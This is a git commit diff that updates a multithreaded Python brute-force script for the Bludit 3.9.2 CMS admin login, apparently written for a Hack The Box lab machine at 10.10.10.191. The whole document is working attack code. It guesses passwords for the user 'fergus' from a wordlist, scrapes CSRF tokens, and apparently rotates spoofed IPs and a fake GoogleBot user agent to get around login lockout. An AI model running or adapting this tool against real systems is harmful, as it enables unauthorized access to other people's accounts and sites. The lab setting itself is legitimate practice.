55046156cdd4163c3a411ea668c95ed0815b52a3
mind2hex <neodeus8@gmail.com>
2020-06-27 22:47:08 -0500

    [bludit_3.9.2-bruteforce.py improved]

--- bludit_3.9.2-bruteforce.py
+++ bludit_3.9.2-bruteforce.py
@@ -13,30 +13,30 @@ import threading
 
 server = "10.10.10.191"
 port = 80
-path = "/admin"  # Path of the bludit login
+path = "/admin/"  # Path of the bludit login
 # user and pass can be a simple word, a list or a path to a dictionary
 # warning: using large files can freeze your box. Experience talking
-userwordlist = ["admin","test","guest","info","user","EgotisticalSW","hackthebox"]
-passwordlist = "/usr/share/wordlists/dirb/big.txt"
-threads = 40  # Elevated use of threads may need a greather timeout
-timeout = 30
+userwordlist = ["fergus"]
+passwordlist = "wordlist.txt"
+threads = 100  # Elevated use of threads may need a greather timeout
+timeout = 60
 errmsg = "Username or password incorrect"  # error message in case of incorrect login attempt
 
-
-
-credentials = ""  # leave this variable empty
+# Leave this variables empty
+credentials = "" 
+attempts = 0
+percent = 0
+total = 0
 
 wordlistpair = [userwordlist, passwordlist]
 for i in range(2):
-    if type(wordlistpair[i] == list):
+    if type(wordlistpair[i]) == list:
         continue
     if os.path.isfile(wordlistpair[i]):
         wordlistpair[i] = open(wordlistpair[i], 'r', encoding="latin-1").read()
-    userwordlist = wordlistpair[0].split("\n")
-    passwordlist = wordlistpair[1].split("\n")
-del wordlistpair
+    wordlistpair[i] = wordlistpair[i].split("\n")
 
-
+    
 def random_ip_generator():
     return "{}.{}.{}.{}".format(random.randint(10,255), random.randint(10,255), \
                                 random.randint(10,255), random.randint(10,255))
@@ -56,18 +56,19 @@ def POST_request(HTTPHandler, head:dict, data, path):
     response = HTTPHandler.getresponse()
     info = response.read().decode()
     token = research('input.+?name="tokenCSRF".+?value="(.+?)"',info)
-    if token == None:
-        print("\n[!] No token found...")
-    else:
-        token = token.group(1)
+
     if research(errmsg,info) == None:
         return True
+    elif token == None:
+        print("\n[!] No token found...")
+        return False
     else:
+        token = token.group(1)
         return token
 
     
 def MainFunction(username,passwordlist,server,port=80,timeout=10,path="/admin/login"):
-    global credentials
+    global credentials,percent,attempts,total
     HTTPHandler = client.HTTPConnection(server,port,timeout)
     HTTPHandler.connect()
     header = {
@@ -75,7 +76,12 @@ def MainFunction(username,passwordlist,server,port=80,timeout=10,path="/admin/lo
         "User-Agent":"GoogleBot",
         "Connection":"keep-alive"
     }
-    token,cookie = get_cookie_N_token(HTTPHandler,header,path)
+    try:
+        token,cookie = get_cookie_N_token(HTTPHandler,header,path)
+    except:
+        print("[X] Unable to connect ")
+        credentiales = False
+        exit()
     for password in passwordlist:
         if len(credentials) > 0:
             exit()
@@ -90,38 +96,46 @@ def MainFunction(username,passwordlist,server,port=80,timeout=10,path="/admin/lo
             "Connection":"close",
             "Cookie":cookie,
         }
-        print("[*] Threads [%03d], Trying: %20s:%-40s"%(threading.active_count(),username,password),end="\r")
+        print(" %03d %03d %08d  | %s:%-40s"%(threading.active_count(),percent,attempts,username,password),end="\r")
+        attempts += 1
+        percent = (attempts*100)//total
         try:
             token = POST_request(HTTPHandler,header,bodydata,path)
         except:
-            print("\n[*] Error: {}:{}".format(username,password))
+            print("[*] Error: %s:%s%40s"%(username,password," "))
             break
             
         if token == True:
             print(f"\n\n[!] FOUND: {username}:{password}")
             credentials = "{}:{}".format(username,password)
             exit()
+        elif token == False:
+            print("[*] Unable to get token...")
+        else:
+            continue
 
     HTTPHandler.close()
 
 pswdict = dict()
 aux1 = aux2 = aux3 = 0
-width = (len(passwordlist)-1)//threads
+width = (len(wordlistpair[1])-1)//threads
 for i in itertools.count(width,width):  # dividing pass wordlist per threads
-    if i >= (len(passwordlist)-1):
-        i = i-(i-(len(passwordlist)-1))
+    if i >= (len(wordlistpair[1])-1):
+        i = i-(i-(len(wordlistpair[1])-1))
         aux3 = 1
-    pswdict[aux1] = passwordlist[aux2:i]
+    pswdict[aux1] = wordlistpair[1][aux2:i]
     aux1 += 1
     aux2 = i
     if aux3 == 1:
         break
 del aux1,aux2,aux3,width
 
-print(userwordlist)
-exit()
+print(" %-3s %-3s %-8s  | %9s"%("Thr","Per","Attempts","User/Pass"))
 
-for user in userwordlist:
+total = len(wordlistpair[1]) - 1
+
+for user in wordlistpair[0]:
+    attempts = 0
     for pswr in pswdict.keys():
         x = threading.Thread(target=MainFunction, args=(user,pswdict[pswr],server,port,timeout,path))
         x.start()
